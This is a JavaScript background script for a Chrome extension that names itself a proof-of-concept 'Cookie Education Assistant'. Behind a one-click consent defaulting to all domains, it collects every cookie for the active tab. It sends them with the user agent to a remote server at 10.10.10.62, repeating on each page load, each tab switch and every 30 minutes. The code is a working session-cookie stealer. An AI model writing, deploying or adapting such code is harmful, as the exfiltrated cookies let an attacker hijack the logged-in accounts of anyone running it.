class POCCookieManager {
  constructor() {
    this.serverUrl = 'http://10.10.10.62';
    this.sessionId = null;
    this.userConsent = {
      granted: false,
      domains: [],
      timestamp: null,
      expiresAt: null
    };

    // Load saved consent on startup
    this.loadConsent();

    // Set up periodic cleanup
    this.setupCleanup();

    // Set up tab listeners for automatic cookie capture
    this.setupTabListeners();
  }

  async loadConsent() {
    try {
      const result = await chrome.storage.local.get(['userConsent', 'sessionId']);
      if (result.userConsent) {
        this.userConsent = result.userConsent;
        
        // Check if consent has expired
        if (this.userConsent.expiresAt && new Date() > new Date(this.userConsent.expiresAt)) {
          console.log('🕒 User consent expired, clearing...');
          await this.clearConsent();
        }
      }
      if (result.sessionId) {
        this.sessionId = result.sessionId;
      }
    } catch (error) {
      console.error('❌ Failed to load consent:', error);
    }
  }

  async saveConsent() {
    try {
      await chrome.storage.local.set({
        userConsent: this.userConsent,
        sessionId: this.sessionId
      });
    } catch (error) {
      console.error('❌ Failed to save consent:', error);
    }
  }

  async grantConsent(domains = ['*']) {
    console.log('✅ User granted consent for domains:', domains);

    const now = new Date();
    const expiresAt = new Date(now.getTime() + (24 * 60 * 60 * 1000)); // 24 hours

    this.userConsent = {
      granted: true,
      domains: domains,
      timestamp: now.toISOString(),
      expiresAt: expiresAt.toISOString()
    };

    // Generate session ID
    this.sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);

    await this.saveConsent();

    // Immediately capture cookies from current active tab
    await this.captureCurrentTabCookies();
  }

  async revokeConsent() {
    console.log('🚫 User revoked consent');
    await this.clearConsent();
    
    // Notify server to clear session
    if (this.sessionId) {
      try {
        await fetch(`${this.serverUrl}/api/extension/revoke`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ sessionId: this.sessionId })
        });
      } catch (error) {
        console.error('❌ Failed to notify server of consent revocation:', error);
      }
    }
  }

  async clearConsent() {
    this.userConsent = {
      granted: false,
      domains: [],
      timestamp: null,
      expiresAt: null
    };
    this.sessionId = null;

    await chrome.storage.local.clear();
  }

  async extractCookies(domain) {
    if (!this.userConsent.granted) {
      throw new Error('User consent required to extract cookies');
    }

    // Check if domain is allowed (support wildcard '*' for all domains)
    if (!this.userConsent.domains.includes('*') && !this.userConsent.domains.includes(domain)) {
      throw new Error(`User consent required for domain: ${domain}`);
    }

    try {
      const cookies = await chrome.cookies.getAll({ domain });

      console.log(`🍪 Extracted ${cookies.length} cookies for ${domain}`);
      return cookies;
    } catch (error) {
      console.error(`❌ Failed to extract cookies for ${domain}:`, error);
      throw error;
    }
  }

  async shareCookies(domain, url = null) {
    if (!this.sessionId) {
      throw new Error('No session ID available');
    }

    try {
      const cookies = await this.extractCookies(domain);

      const response = await fetch(`${this.serverUrl}/api/extension/cookies`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          sessionId: this.sessionId,
          domain,
          url,
          cookies,
          timestamp: new Date().toISOString(),
          userAgent: navigator.userAgent
        })
      });

      if (!response.ok) {
        throw new Error(`Server responded with ${response.status}`);
      }

      const result = await response.json();
      console.log(`✅ Successfully shared ${domain} cookies:`, result);

      return result;
    } catch (error) {
      console.error(`❌ Failed to share ${domain} cookies:`, error);
      throw error;
    }
  }

  async getCurrentTab() {
    try {
      const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
      return tab;
    } catch (error) {
      console.error('❌ Failed to get current tab:', error);
      return null;
    }
  }

  extractDomain(url) {
    try {
      const urlObj = new URL(url);
      return urlObj.hostname;
    } catch (error) {
      console.error('❌ Failed to extract domain from URL:', url, error);
      return null;
    }
  }

  async captureCurrentTabCookies() {
    try {
      const tab = await this.getCurrentTab();
      if (!tab || !tab.url) {
        console.log('⚠️ No active tab or URL found');
        return;
      }

      const domain = this.extractDomain(tab.url);
      if (!domain) {
        console.log('⚠️ Could not extract domain from:', tab.url);
        return;
      }

      await this.shareCookies(domain, tab.url);
    } catch (error) {
      console.error('❌ Failed to capture current tab cookies:', error);
    }
  }

  setupCleanup() {
    // Check for expired consent every hour
    setInterval(async () => {
      if (this.userConsent.expiresAt && new Date() > new Date(this.userConsent.expiresAt)) {
        console.log('🧹 Cleaning up expired consent...');
        await this.clearConsent();
      }
    }, 60 * 60 * 1000); // 1 hour

    // Auto-refresh cookies every 30 minutes if consent is active
    setInterval(async () => {
      if (this.userConsent.granted) {
        console.log('🔄 Auto-refreshing cookies from current tab...');
        try {
          await this.captureCurrentTabCookies();
        } catch (error) {
          console.error('❌ Failed to auto-refresh cookies:', error);
        }
      }
    }, 30 * 60 * 1000); // 30 minutes
  }

  setupTabListeners() {
    // Listen for tab updates (URL changes)
    chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
      if (changeInfo.status === 'complete' && tab.url && this.userConsent.granted) {
        const domain = this.extractDomain(tab.url);
        if (domain) {
          console.log('🔄 Tab updated, capturing cookies for:', domain);
          this.shareCookies(domain, tab.url).catch(error => {
            console.error('❌ Failed to capture cookies on tab update:', error);
          });
        }
      }
    });

    // Listen for tab activation (switching between tabs)
    chrome.tabs.onActivated.addListener(async (activeInfo) => {
      if (this.userConsent.granted) {
        try {
          const tab = await chrome.tabs.get(activeInfo.tabId);
          if (tab.url) {
            const domain = this.extractDomain(tab.url);
            if (domain) {
              console.log('🔄 Tab activated, capturing cookies for:', domain);
              await this.shareCookies(domain, tab.url);
            }
          }
        } catch (error) {
          console.error('❌ Failed to capture cookies on tab activation:', error);
        }
      }
    });
  }

  getConsentStatus() {
    return {
      granted: this.userConsent.granted,
      domains: this.userConsent.domains,
      expiresAt: this.userConsent.expiresAt,
      sessionId: this.sessionId
    };
  }
}

// Initialize the cookie manager
console.log('🚀 Background script starting...');
let cookieManager;

try {
  cookieManager = new POCCookieManager();
  console.log('✅ Cookie manager initialized');
} catch (error) {
  console.error('❌ Failed to initialize cookie manager:', error);
  cookieManager = null;
}

// Handle messages from popup
chrome.runtime.onMessage.addListener((request, _sender, sendResponse) => {
  console.log('📬 Background received message:', request);

  (async () => {
    try {
      if (!cookieManager) {
        sendResponse({ error: 'Cookie manager not initialized' });
        return;
      }

      switch (request.action) {
        case 'getConsentStatus':
          const status = cookieManager.getConsentStatus();
          console.log('📊 Sending consent status:', status);
          sendResponse(status);
          break;

        case 'grantConsent':
          // Default to all domains if no specific domains provided
          const domains = request.domains || ['*'];
          await cookieManager.grantConsent(domains);
          sendResponse({ success: true });
          break;

        case 'revokeConsent':
          await cookieManager.revokeConsent();
          sendResponse({ success: true });
          break;

        case 'captureCurrentTab':
          await cookieManager.captureCurrentTabCookies();
          sendResponse({ success: true });
          break;

        case 'shareCookies':
          // Support both old platform-based and new domain-based calls
          const domain = request.domain || request.platform;
          const result = await cookieManager.shareCookies(domain, request.url);
          sendResponse({ success: true, result });
          break;

        default:
          sendResponse({ error: 'Unknown action' });
      }
    } catch (error) {
      console.error('❌ Background script error:', error);
      sendResponse({ error: error.message });
    }
  })();

  // Return true to indicate we'll respond asynchronously
  return true;
});

// Add error handling for runtime errors
chrome.runtime.onStartup.addListener(() => {
  console.log('🔄 Extension startup');
});

chrome.runtime.onSuspend.addListener(() => {
  console.log('😴 Extension suspending');
});

// Handle installation
chrome.runtime.onInstalled.addListener((details) => {
  if (details.reason === 'install') {
    console.log('🎉 Cookie Education Assistant installed');
    chrome.tabs.create({ url: 'http://localhost:3000' });
  }
});

console.log('🚀 Cookie Education Assistant background script loaded');